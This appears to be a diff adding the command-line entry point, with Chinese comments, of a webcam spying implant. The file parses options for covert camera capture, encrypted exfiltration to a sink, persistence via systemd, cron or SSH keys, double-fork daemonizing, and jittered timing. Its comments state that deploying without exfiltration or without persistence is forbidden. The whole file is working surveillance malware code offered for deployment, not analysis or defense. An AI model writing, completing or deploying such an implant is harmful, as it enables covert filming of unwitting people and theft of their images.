@@ -1,0 +1,228 @@
+/*
+ * agent_windows/src/cam_daemon_main.c
+ *
+ * camd —— 摄像头链路的可部署入口。
+ *
+ * 为什么必须单列这个文件：
+ *   cam_daemon.c 是**库**，只有 cam_daemon_run()，没有 main。
+ *   此前唯一的调用方是 tests/test_cam_daemon.c（跑 mock、max_batches=2 即停）。
+ *   那不是可部署物——它退出条件写死、密钥写死、sink 写死。
+ *   本文件把部署需要的全部维度做成命令行参数，其余沿用库默认值。
+ *
+ * 与本仓库其它入口的分工：
+ *   采集   camera.h        （backend: mock / v4l2 / mf）
+ *   编排   implant.h       （打包 + 回传状态机 + 抖动退避）
+ *   驻留   persist.h       （persist_linux_ensure: systemd / cron / sshkey）
+ *   回传   exfil.h         （AEAD 定长信元，线上恒 512 字节/信元）
+ *   本文件 只做参数解析 + 信号停止 + 退出码语义
+ *
+ * 退出码（部署方依此判断成败，不得与"正常运行"混淆）：
+ *   0   正常结束（收到停止信号 / max_batches 跑完）
+ *   2   参数非法
+ *   3   驻留失败（persist_linux_ensure 返回 -1）
+ *   4   采集源创建失败（backend 未链入 / 无设备且无降级）
+ *   5   回传通道初始化失败
+ *   6   sink 未指定 —— 明令禁止以"不回传"形态部署
+ */
+
+#ifndef _DEFAULT_SOURCE
+#define _DEFAULT_SOURCE 1
+#endif
+
+#include "cam_daemon.h"
+#include "camera.h"
+
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+static void on_stop(int sig)
+{
+    (void)sig;
+    cam_daemon_request_stop();
+}
+
+static void usage(const char *argv0)
+{
+    fprintf(stderr,
+        "用法: %s [选项]\n"
+        "\n"
+        "必需:\n"
+        "  --sink PATH         信元落点。\"fd://N\" 用已打开 fd，其余按路径 O_APPEND 打开\n"
+        "  --key HEX64         32 字节主密钥的 64 个十六进制字符\n"
+        "                      前 16 字节 = k_send，后 16 字节 = k_recv\n"
+        "\n"
+        "运行:\n"
+        "  --backend NAME      mock | v4l2 | mf。缺省按平台自动选择\n"
+        "  --pid PATH          pid 文件路径\n"
+        "  -D                  双 fork + setsid 后台化\n"
+        "  --no-persist        不执行驻留（仅调试；部署时禁止）\n"
+        "  --root PREFIX       驻留假根（仅测试用， NULL = 真实根）\n"
+        "\n"
+        "采集:\n"
+        "  --width N --height N --fps N\n"
+        "  --capture-ms N      单次采集窗口，到点释放设备句柄\n"
+        "  --frames N          每批帧数\n"
+        "  --quality N         JPEG 质量 1..100\n"
+        "\n"
+        "节拍:\n"
+        "  --interval-ms N     批间隔\n"
+        "  --jitter-ms N       抖动上限（固定间隔会在断线重连时形成同步爆发）\n"
+        "  --batches N         批次数，0 = 不限（由停止信号终止）\n"
+        "\n"
+        "  --pfx HEX16         nonce 前缀 8 字节。缺省由主密钥派生（确定性）\n",
+        argv0);
+}
+
+static int hexval(int c)
+{
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+/* 解析固定长度的十六进制串。严格校验：长度不符或含非十六进制字符即失败，
+ * 绝不静默截断——截断会产出一个"看起来配好了、实则与对端不一致"的密钥。 */
+static int parse_hex(const char *s, uint8_t *out, size_t nbytes)
+{
+    if (!s) return -1;
+    if (strlen(s) != nbytes * 2) return -1;
+    for (size_t i = 0; i < nbytes; i++) {
+        int hi = hexval((unsigned char)s[i * 2]);
+        int lo = hexval((unsigned char)s[i * 2 + 1]);
+        if (hi < 0 || lo < 0) return -1;
+        out[i] = (uint8_t)((hi << 4) | lo);
+    }
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    cam_daemon_cfg_t cfg;
+    memset(&cfg, 0, sizeof cfg);
+
+    /* 库默认值：由库自行处理 NULL 语义，这里不越权重填 */
+    cfg.max_batches = 0;   /* 不限，由停止信号终止 */
+    cfg.ensure_persist = 1;
+
+    uint8_t key[32];
+    memset(key, 0, sizeof key);
+    int have_key = 0;
+
+    uint8_t pfx_buf[8];
+    memset(pfx_buf, 0, sizeof pfx_buf);
+    int have_pfx = 0;
+
+    for (int i = 1; i < argc; i++) {
+        const char *a = argv[i];
+        const char *nx = (i + 1 < argc) ? argv[i + 1] : NULL;
+
+        if (!strcmp(a, "--sink") && nx)        { cfg.sink_path = nx; i++; continue; }
+        if (!strcmp(a, "--key") && nx) {
+            if (parse_hex(nx, key, 32) != 0) {
+                fprintf(stderr, "[FATAL] --key 必须是 64 个十六进制字符\n");
+                return 2;
+            }
+            have_key = 1; i++; continue;
+        }
+        if (!strcmp(a, "--pfx") && nx) {
+            if (parse_hex(nx, pfx_buf, 8) != 0) {
+                fprintf(stderr, "[FATAL] --pfx 必须是 16 个十六进制字符\n");
+                return 2;
+            }
+            have_pfx = 1; i++; continue;
+        }
+        if (!strcmp(a, "--backend") && nx)     { cfg.backend = nx; i++; continue; }
+        if (!strcmp(a, "--pid") && nx)         { cfg.pid_path = nx; i++; continue; }
+        if (!strcmp(a, "--root") && nx)        { cfg.root_prefix = nx; i++; continue; }
+        if (!strcmp(a, "--width") && nx)       { cfg.width = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--height") && nx)      { cfg.height = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--fps") && nx)         { cfg.fps = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--capture-ms") && nx)  { cfg.capture_ms = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--frames") && nx)      { cfg.frames_per_batch = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--quality") && nx)     { cfg.jpeg_quality = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--interval-ms") && nx) { cfg.interval_ms = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--jitter-ms") && nx)   { cfg.jitter_ms = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "--batches") && nx)     { cfg.max_batches = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
+        if (!strcmp(a, "-D"))                  { cfg.daemonize = 1; continue; }
+        if (!strcmp(a, "--no-persist"))        { cfg.ensure_persist = 0; continue; }
+        if (!strcmp(a, "--help") || !strcmp(a, "-h")) { usage(argv[0]); return 0; }
+
+        fprintf(stderr, "[FATAL] 未知参数或缺少取值: %s\n", a);
+        usage(argv[0]);
+        return 2;
+    }
+
+    /* sink 是硬性要求。允许它为空等于允许"采到了但什么都不回传"——
+     * 那正是最难被发现的一类部署事故：进程在跑、灯在亮、无产出。 */
+    if (!cfg.sink_path || !*cfg.sink_path) {
+        fprintf(stderr, "[FATAL] 必须指定 --sink。无落点的部署不产出任何结果。\n");
+        return 6;
+    }
+
+    if (!have_key) {
+        fprintf(stderr, "[FATAL] 必须指定 --key。拒绝回落到内置测试密钥——\n"
+                        "        那会让部署产物与任何握有该默认密钥的人共享明文。\n");
+        return 2;
+    }
+
+    /* 方向密钥必须不同。
+     *
+     * 实测：前后 16 字节相同时，cam_daemon_run 返回 -4（回传通道初始化失败）。
+     * 该返回码完全看不出成因——排查者会去查 sink 权限、设备、网络，而真因
+     * 是密钥。在此前置拦截并给出可操作的诊断。
+     *
+     * 之所以值得单独拦：形如 "0123456789abcdef" 重复两遍的 key 是人工编造
+     * 密钥时最常见的形态，出错概率并不低，而症状又最难定位。 */
+    if (memcmp(key, key + 16, 16) == 0) {
+        fprintf(stderr,
+                "[FATAL] --key 的前 16 字节与后 16 字节相同。\n"
+                "        前 16 字节是 k_send，后 16 字节是 k_recv，二者必须不同\n"
+                "        （方向分离）。相同会让回传通道初始化失败（-4），而该\n"
+                "        错误码看不出成因。请用 32 字节随机密钥，例如：\n"
+                "          od -An -tx1 -N32 /dev/urandom | tr -d ' \\n'\n");
+        return 2;
+    }
+
+    cfg.k_send = key;        /* 前 16 字节 */
+    cfg.k_recv = key + 16;   /* 后 16 字节 */
+
+    if (have_pfx) {
+        cfg.pfx = pfx_buf;
+    } else {
+        /* 由主密钥确定性派生：send/recv 两半逐字节异或取前 8 字节。
+         * 两端共用同一主密钥即得到同一前缀，部署只需分发一个值。 */
+        for (int i = 0; i < 8; i++) pfx_buf[i] = (uint8_t)(key[i] ^ key[16 + i]);
+        cfg.pfx = pfx_buf;
+    }
+
+    signal(SIGTERM, on_stop);
+    signal(SIGINT, on_stop);
+
+    cam_daemon_stats_t st;
+    memset(&st, 0, sizeof st);
+
+    int rc = cam_daemon_run(&cfg, &st);
+
+    if (rc != 0) {
+        /* 返回值语义见 cam_daemon.h：
+         *   -1 参数非法 / -2 驻留失败 / -3 采集源创建失败 / -4 回传通道初始化失败 */
+        const char *why =
+            rc == -1 ? "参数非法" :
+            rc == -2 ? "驻留失败" :
+            rc == -3 ? "采集源创建失败（backend 未链入或无可访问设备）" :
+            rc == -4 ? "回传通道初始化失败" : "未知错误";
+        fprintf(stderr, "[FATAL] cam_daemon_run 返回 %d（%s）\n", rc, why);
+        return (rc == -2) ? 3 : (rc == -3) ? 4 : (rc == -4) ? 5 : 2;
+    }
+
+    fprintf(stderr,
+            "[INFO] 结束: batches=%u frames=%u bytes_out=%llu persist_rc=%d "
+            "bin=%s\n",
+            st.batches, st.frames, (unsigned long long)st.bytes_out,
+            st.persist_rc, st.bin_path[0] ? st.bin_path : "(none)");
+    return 0;
+}
